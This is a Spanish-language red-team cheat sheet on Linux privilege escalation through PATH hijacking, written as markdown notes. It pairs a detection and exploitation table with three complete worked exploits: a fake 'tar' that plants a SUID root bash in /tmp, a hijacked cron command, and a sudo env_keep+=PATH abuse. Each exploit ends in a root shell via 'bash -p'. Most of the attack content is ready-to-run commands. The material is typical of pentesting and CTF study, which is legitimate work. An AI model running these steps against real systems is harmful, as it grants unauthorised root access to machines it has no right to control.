---
aliases:
  - PATH Hijacking
  - PATH Injection
tags:
  - type/cheatsheet
  - env/linux
  - technique/privilege-escalation
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Privilege Escalation]]"
type: CheatSheet
linked:
  - "[[Linux Privilege Escalation]]"
  - "[[Linux PrivEsc - SUID y SGID]]"
  - "[[Linux PrivEsc - Cron Jobs]]"
---
# Linux PrivEsc - PATH Hijacking

***

## Cheatsheet

| **Escenario**                        | **Detección**                                                                                 | **Explotación**                                                           |
| ------------------------------------ | --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| **SUID binary custom**               | `strings /path/suid_bin \| grep -iE 'system\|exec'` → busca comandos sin `/`                 | Crear binario con nombre del comando, ajustar PATH, ejecutar SUID.        |
| **Cron / systemd script**            | `cat /etc/crontab` + scripts en `/etc/cron.*/*` invocando comandos relativos                  | Crear binario en dir escribible, agregar al PATH del cron.                |
| **Wrapper shell script con sudo**    | `sudo -l` → script permitido que internamente llama comandos sin path                         | `PATH=/tmp:$PATH sudo /ruta/script.sh` (si env_keep preserva PATH).       |
| **Directorio escribible en PATH**    | `echo $PATH \| tr ':' '\n'`                                                                   | Si hay dir world-writable (`/tmp/bin`) antes del sistema, colocar hijack. |
| **Variables preservadas en sudoers** | `cat /etc/sudoers` → `Defaults env_keep+="PATH"`                                              | PATH del usuario sobrevive en sudo → hijack directo.                      |

^linux-privesc-path-hijack

## Explotación típica

### 1. SUID binary con comando relativo

```bash
# Enumeración
find / -perm -4000 -type f 2>/dev/null
# Supongamos /usr/local/bin/backup es SUID root y hace `sh -c "tar czf /var/backup.tgz /data"`
strings /usr/local/bin/backup | grep -E 'tar|cp|rm'
# → confirmado que llama `tar` sin path absoluto

# Hijack
cd /tmp
cat > tar << 'SH'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
SH
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup
/tmp/rootbash -p
# → UID 0
```

### 2. Cron con PATH hijack

```bash
# Si /etc/crontab define PATH=/home/user/bin:/usr/bin:/bin
# y /home/user/bin es escribible por user
mkdir -p /home/user/bin
cat > /home/user/bin/<comando-llamado-por-cron> << 'SH'
#!/bin/bash
chmod u+s /bin/bash
SH
chmod +x /home/user/bin/<comando-llamado-por-cron>
# Esperar tick de cron
/bin/bash -p
```

### 3. Sudoers con env_keep+=PATH

```bash
sudo -l
# Output:
# Defaults env_keep += "PATH"
# (root) NOPASSWD: /opt/admin.sh
cat /opt/admin.sh
# #!/bin/bash
# apache2ctl restart
# ↑ apache2ctl sin path absoluto

cd /tmp
cat > apache2ctl << 'SH'
#!/bin/bash
chmod u+s /bin/bash
SH
chmod +x apache2ctl
PATH=/tmp:$PATH sudo /opt/admin.sh
/bin/bash -p
```

## Notas clave

- `sudo` por defecto **resetea PATH** a `secure_path` (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`). Sin `env_keep+=PATH` o sin `!secure_path` en sudoers, PATH hijack vía sudo no funciona.
- Scripts bash con `#!/bin/bash -e` o `set -euo pipefail` **no cambian** la resolución de PATH — el hijack funciona igual.
- En SUID compilados (C), si usan `execvp` / `execlp` / `system`, resuelven por PATH. Si usan `execve` con path absoluto, **no** son vulnerables.
- Revisar siempre `strings`, `ltrace`, `strace` antes de asumir que un binario es hijackeable.
- Búsqueda de dirs escribibles en PATH: `for d in $(echo $PATH | tr ':' ' '); do [ -w "$d" ] && echo "writable: $d"; done`.

***
